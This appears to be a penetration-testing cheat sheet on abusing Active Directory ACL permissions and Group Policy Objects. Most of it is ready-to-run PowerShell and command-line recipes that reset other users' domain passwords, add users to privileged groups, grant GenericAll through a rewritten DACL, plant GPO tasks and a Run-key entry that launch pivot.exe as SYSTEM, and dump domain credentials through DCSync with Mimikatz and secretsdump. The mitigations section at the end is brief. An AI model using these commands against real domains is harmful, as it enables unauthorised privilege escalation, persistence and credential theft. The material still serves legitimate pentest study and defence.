# Abusing ACLs and GPOs

## GenericAll

### On User

If we have some form of GenericAll on a user, we can simply reset the password of this user without knowing their current password

```powershell
net user vulnerable_username youhavebeenpwned@! /domain
```

### On Group

For Groups, we can just add our current user into the group and then be able to gain more privileges that way.

```powershell
net group "Vulnerable Group" compromised_user /add /domain

# PowerSploit
Add-NetGroupUser -Username <user> -GroupName <group> -Domain <domain>

# AD Module
Add-ADGroupMember -Identity "<group"> -Members <user>
```

## GenericAll / GenericWrite on Computer

If we have privileges over an object, we can opt to either abuse this ACL or use [Kerberos Resource-Based Constrained Delegation](../kerberos/attacking-kerberos.md#resourced-based-constrained-delegation).

## GenericWrite on User

With this, we are able to chagne the Script-Path of the logon script of the user. In short, whenever we login to Windows, there is a .bat file or something with a ton of commands in there that are executed. This can be modified, and we could gain a reverse shell everytime a user logs in, for example.

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -ResolveGUIDs -SamAccountName <user> | ? {$_.IdentityReference -eq "<domain>\<user>"}
```
{% endcode %}

## WriteProperty on Group

Since our compromised user is able to write the group, we can add any user we want into the group.

```powershell
net group "<group name>" <user> /add /domain
```

## ForceChangePassword

With PowerView, we can force a change of another user's password, or we can try to convert the password to a secure string and then be able to change it from there

{% code overflow="wrap" %}
```powershell
Set-DomainUserPassword -Identity <user> -Verbose
# directly change

$cred = "password@123!"
Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString $cred -AsPlainText -Force) -Verbose
# change password with secure string
```
{% endcode %}

## WriteOwner on Group

If we have WriteOwner on a Group, then we can simply change the ownership of this group to someone else.

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=<group name>,CN=Users,DC=domain,DC=local" -and $_.IdentityReference -eq "domain\user"}
#find SID of the group

Set-DomainObjectOwner -Identity S-1-5-21... -OwnerIdentity "<user>" -Verbose
```
{% endcode %}

Once we are the owner of the group, we can simply add whoever we want to this group.

## WriteDACL + WriteOwner

With these two privileges over a group, we are able to **change our privileges to whatever we want.** Obviously the best is the GenericAll privilege.

{% code overflow="wrap" %}
```powershell
$ADSI = [ADSI]"LDAP://CN=<group>,CN=Users,DC=domain,DC=local"

$IdentityReference = (New-Object System.Security.Principal.NTAccount("<user>")).Translate([System.Security.Principal.SecurityIdentifier])

$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"

$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)

$ADSI.psbase.commitchanges()
```
{% endcode %}

## Self-Membership

Attackers can add whoever they want into the group.

```
net group "<group name>" <user> /add /domain
```

## GPO Abuse

Suppose there are weak permissions over the domain GPOs, and we can edit them. GPOs typically have some kind of script that is consistenly running on a system, like a cronjob. We can change these to execute commands as the SYSTEM user, which normally runs GPOs as well.

These use PowerView, or the SharpGPOAbuse.exe binary.

{% code overflow="wrap" %}
```powershell
# create new GPO task and execute immediately
New-GPOImmediateTask -TaskName task01 -Command cmd -CommandArguments "/c whoami" -GPODisplayName "Misconfigured Policy" -Verbose -Force

# create new GPO and specify new task, such as running pivot.exe 
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString

# using .exe to exploit this easily
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

#refreshes and reruns all scripts for GPOs, including malicious ones
gpupdate /force
```
{% endcode %}

{% embed url="https://github.com/FSecureLABS/SharpGPOAbuse" %}

## DCSync Attacks

This attack would simulate the behaviour of the Domain Controller and asks the other DCs to copy information. The function for DCs to copy information from one another is critical to daily operations, and hence cannot be turned off.

Once identified, we are able to either exploit it locally or remotely:

```bash
# local
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\user"'
# remote
secretsdump.py -just-dc <user>:<password>@<ipaddress>
```

## Mitigations

### Check Privileges

Ensure that the privileges are not assigned, and only to users that need it

### Password Complexity

Change passwords every so often, and make sure that accounts with high privileges don't have something stupid like your birthday as a password.

### Update Domain Software

A little hard, but still needed. Most of the time, these privileges aren't checked and monitored too often, and some companies tend to start using the AD network out of the box. It is key to keep the system updated, as Microsoft would frequently change the default permissions on objects and policies within the domain
